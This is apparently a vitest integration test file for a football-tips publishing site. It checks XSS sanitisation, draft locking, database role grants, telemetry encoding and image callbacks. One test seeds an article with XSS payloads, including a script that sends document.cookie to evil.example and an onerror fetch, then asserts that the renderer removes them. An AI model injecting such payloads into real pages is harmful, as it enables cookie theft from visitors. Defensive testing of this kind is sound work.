import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import pg from 'pg';
import { loadRepo, loadSiteRender } from '../support/seams.js';
import {
  captureSqlError,
  seedArticle,
  seedWriter,
  startTestDatabase,
  type TestDatabase,
} from '../support/pg.js';

/**
 * The half of the verify-gate remediation that only real Postgres can prove.
 *
 *   VERIFY-01b   defence in depth: even a row that was poisoned some other way
 *                (a direct PostgREST PATCH, a bypassed sanitiser) must not
 *                render executable markup to a visitor.
 *   VERIFY-04a   `createRepo()` implements neither `insertDraft` nor
 *                `takeLock` — the `tsc` error in §4. The CAS semantics already
 *                proven as raw SQL in schema.test.ts must hold for the
 *                production method too.
 *   VERIFY-04b   the privilege model: `authenticated` has no INSERT on
 *                `articles`, correctly, so the server-side seam needs a role
 *                that does. A new expand-only migration must supply it.
 *   VERIFY-07    §8.1's double-JSON-encoded `draft_started.payload.started_at`.
 *   NFR-CALLBACK-03  ADR-0004's status callback really writing `optimized_url`.
 *
 * One container for the file, started in `beforeAll`; setup failures are
 * captured and rethrown inside each test body so a missing module fails the
 * tests individually rather than silently skipping the file.
 */

const SITE_ORIGIN = 'https://fantasycoach.example';
const CDN_ORIGIN = 'https://cdn.fantasycoach.example';

type Ctx = { db: TestDatabase; pool: pg.Pool; writerA: string; writerB: string };

let started: Ctx | null = null;
let startupError: Error | null = null;

beforeAll(async () => {
  let db: TestDatabase | null = null;
  try {
    db = await startTestDatabase();
    const pool = new pg.Pool({ connectionString: db.connectionUri, max: 4 });
    started = {
      db,
      pool,
      writerA: await seedWriter(db.client, 'Marie D.'),
      writerB: await seedWriter(db.client, 'Lionel Le Boiteux'),
    };
  } catch (err) {
    startupError = err as Error;
    await db?.stop().catch(() => undefined);
  }
}, 240_000);

afterAll(async () => {
  await started?.pool.end().catch(() => undefined);
  await started?.db.stop().catch(() => undefined);
});

function ctx(): Ctx {
  if (startupError) throw startupError;
  return started as Ctx;
}

// ---------------------------------------------------------------------------
// #1b — the public site must survive a poisoned row
// ---------------------------------------------------------------------------

describe('public site XSS defence in depth (verify finding #1)', () => {
  it('VERIFY-01b / NFR-XSS-01: an article row whose body_html was poisoned directly in the database still renders with no script tag, no inline event handler and no javascript: href', async () => {
    const { db } = ctx();
    const { createSiteRenderer } = await loadSiteRender();

    // Deliberately inserted with raw SQL: this is the "sanitisation was
    // bypassed once" case, so the row must not be laundered on the way in.
    await seedArticle(db.client, {
      writer_id: ctx().writerA,
      title: 'Journée 15 : les affiches',
      league_name: 'Ligue 1',
      type_name: 'Pronos',
      status: 'published',
      slug: 'journee-15-les-affiches',
      published_at: '2026-08-12T09:00:00Z',
      body_html: [
        '<h2>Les affiches</h2>',
        '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
        '<p>PSG reçoit Marseille dimanche soir.</p>',
        '<img src="x" onerror="fetch(\'https://evil.example/steal\')"/>',
        '<div onclick="alert(1)">Cliquez ici</div>',
        '<a href="javascript:alert(document.domain)">Notre analyse</a>',
      ].join(''),
    });

    const renderer = await createSiteRenderer({
      databaseUrl: db.connectionUri,
      siteOrigin: SITE_ORIGIN,
      cdnOrigin: CDN_ORIGIN,
    });
    let html = '';
    try {
      html = (
        await renderer.renderArticlePage({
          league_slug: 'ligue-1',
          season_slug: '26-27',
          type_slug: 'pronos',
          slug: 'journee-15-les-affiches',
        })
      ).html;
    } finally {
      await renderer.close().catch(() => undefined);
    }

    // Scoped to the article body specifically, not the whole page: the page
    // legitimately carries its own <script> tags in <head> (JSON-LD, and —
    // since this session's fc-shared integration — the shared nav/ads
    // loaders), none of which are the thing this test is about. What must
    // never survive is the poisoned *body_html* reaching a visitor's
    // browser, so that's the one substring these checks run against.
    const bodyMatch = /<div class="body">([\s\S]*?)<\/div><\/main>/.exec(html);
    const body = bodyMatch?.[1] ?? '';

    expect({
      executable_script_tags: [...body.matchAll(/<script/gi)].length,
      inline_event_handlers: /\son(error|click|load|mouseover)\s*=/i.test(body),
      javascript_href: /href\s*=\s*["']?\s*javascript:/i.test(body),
      still_renders_the_article: html.includes('PSG reçoit Marseille dimanche soir.'),
    }).toEqual({
      executable_script_tags: 0,
      inline_event_handlers: false,
      javascript_href: false,
      still_renders_the_article: true,
    });
  });
});

// ---------------------------------------------------------------------------
// #4 — draft creation on the real repository
// ---------------------------------------------------------------------------

describe('draft creation on the real repository (verify finding #4)', () => {
  it('AC-01 / VERIFY-04a: createRepo().insertDraft writes a real draft row attributed to the calling writer', async () => {
    const { db, pool, writerB } = ctx();
    const repo = (await loadRepo()).createRepo(pool);

    const draft = await repo.insertDraft({ writer_id: writerB, title: 'Pronos Ligue 1 - Journée 16' });
    const row = await db.client.query(
      `select writer_id, title, status from articles where id = $1`,
      [draft.id],
    );

    expect(row.rows[0]).toEqual({
      writer_id: writerB,
      title: 'Pronos Ligue 1 - Journée 16',
      status: 'draft',
    });
  });

  type LockCase = { id: string; klass: string; heldBy: 'nobody' | 'other'; ageSeconds: number; taken: boolean };

  const LOCK_CASES: LockCase[] = [
    {
      id: 'AC-05-free',
      klass: 'a draft nobody holds is locked by the writer opening it',
      heldBy: 'nobody',
      ageSeconds: 0,
      taken: true,
    },
    {
      id: 'AC-05-held',
      klass: 'a draft another writer’s heartbeat is keeping current is not stolen',
      heldBy: 'other',
      ageSeconds: 5,
      taken: false,
    },
    {
      id: 'AC-05-stale',
      klass: 'a draft another writer left locked 91 seconds ago is taken over with no admin unlock',
      heldBy: 'other',
      ageSeconds: 91,
      taken: true,
    },
  ];

  it.each(LOCK_CASES.map((c) => [`${c.id}: createRepo().takeLock — ${c.klass}`, c] as const))(
    '%s',
    async (_title, c) => {
      const { db, pool, writerA, writerB } = ctx();
      const repo = (await loadRepo()).createRepo(pool);
      const article = await seedArticle(db.client, {
        writer_id: writerA,
        title: `Verrou ${c.id}`,
        league_name: 'Bundesliga',
        type_name: 'Mercato',
      });
      if (c.heldBy === 'other') {
        await db.client.query(
          `update articles
              set locked_by = $2, locked_at = now() - ($3 || ' seconds')::interval
            where id = $1`,
          [article, writerA, String(c.ageSeconds)],
        );
      }

      const taken = await repo.takeLock({ article_id: article, writer_id: writerB, now: new Date() });
      const after = await db.client.query(`select locked_by from articles where id = $1`, [article]);

      expect({ taken, locked_by: after.rows[0]?.locked_by }).toEqual({
        taken: c.taken,
        locked_by: c.taken ? writerB : writerA,
      });
    },
  );

  it('VERIFY-04b / NFR-GRANT-01: the elevated role the draft-creation seam runs as can insert an article, while `authenticated` still cannot — the privilege split the seam exists to enforce', async () => {
    const { db, writerA } = ctx();

    const attemptInsertAs = (role: string) =>
      captureSqlError(async () => {
        await db.client.query(`set role ${role}`);
        try {
          await db.client.query(
            `insert into articles (writer_id, title, body_html, status)
             values ($1, $2, '<p>x</p>', 'draft')`,
            [writerA, `Insert as ${role}`],
          );
        } finally {
          await db.client.query('reset role');
        }
      });

    expect({
      service_role: await attemptInsertAs('service_role'),
      authenticated: await attemptInsertAs('authenticated'),
    }).toEqual({
      service_role: null, // no error: the new expand-only migration grants it
      authenticated: '42501', // insufficient_privilege, unchanged
    });
  });
});

// ---------------------------------------------------------------------------
// #7 — the backfilled draft_started payload
// ---------------------------------------------------------------------------

describe('telemetry payload encoding (verify finding #7)', () => {
  it('VERIFY-07 / TELEMETRY-draft_started: the publish-time backfill writes payload.started_at as a plain ISO timestamp, not a JSON string wrapped in a second set of quotes', async () => {
    const { db, pool, writerB } = ctx();
    const repo = (await loadRepo()).createRepo(pool);
    const article = await seedArticle(db.client, {
      writer_id: writerB,
      title: 'Backfill du started_at',
      league_name: 'Ligue 1',
      type_name: 'Pronos',
    });

    await repo.recordTelemetry(article, [
      {
        event_type: 'article_published',
        writer_id: writerB,
        article_id: article,
        occurred_at: '2026-08-12T10:47:12.000Z',
        payload: { published_at: '2026-08-12T10:47:12.000Z', is_republish: false },
      },
    ]);
    const res = await db.client.query(
      `select payload->>'started_at' as started_at
         from arsene_telemetry_events
        where article_id = $1 and event_type = 'draft_started'`,
      [article],
    );
    const started_at = String(res.rows[0]?.started_at ?? '');

    expect({
      rows: res.rowCount,
      wrapped_in_literal_quotes: started_at.startsWith('"'),
      parses_as_a_timestamp: Number.isFinite(Date.parse(started_at)),
    }).toEqual({ rows: 1, wrapped_in_literal_quotes: false, parses_as_a_timestamp: true });
  });
});

// ---------------------------------------------------------------------------
// ADR-0004 — the status callback's database half
// ---------------------------------------------------------------------------

describe('image status callback persistence (ADR-0004)', () => {
  it('NFR-CALLBACK-03: flipping a processing image to ready stores the optimized URL, and a second flip of the same row changes nothing — the compare-and-swap is in the database, not only in the handler', async () => {
    const { db, pool, writerB } = ctx();
    const repo = (await loadRepo()).createRepo(pool);
    const article = await seedArticle(db.client, {
      writer_id: writerB,
      title: 'Image en cours de traitement',
      league_name: 'Ligue 1',
      type_name: 'Pronos',
    });
    const inserted = await db.client.query(
      `insert into article_images (article_id, role, status, original_filename, original_url)
       values ($1, 'cover', 'processing', 'psg-om-cover.jpg', 'https://s3.example/originals/x.jpg')
       returning id`,
      [article],
    );
    const image_id: string = inserted.rows[0].id;
    const optimized_url = `https://cdn.fantasycoach.example/articles/${image_id}-optimized.webp`;

    const first = await repo.setImageStatus({ image_id, status: 'ready', optimized_url, failure: null });
    const second = await repo.setImageStatus({
      image_id,
      status: 'failed',
      optimized_url: null,
      failure: { code: 'CORRUPTED_FILE', message: 'replayed callback' },
    });
    const row = await db.client.query(
      `select status, optimized_url from article_images where id = $1`,
      [image_id],
    );

    expect({
      first_flip_applied: first,
      replayed_flip_applied: second,
      status: row.rows[0]?.status,
      optimized_url: row.rows[0]?.optimized_url,
    }).toEqual({
      first_flip_applied: true,
      replayed_flip_applied: false,
      status: 'ready',
      optimized_url,
    });
  });
});
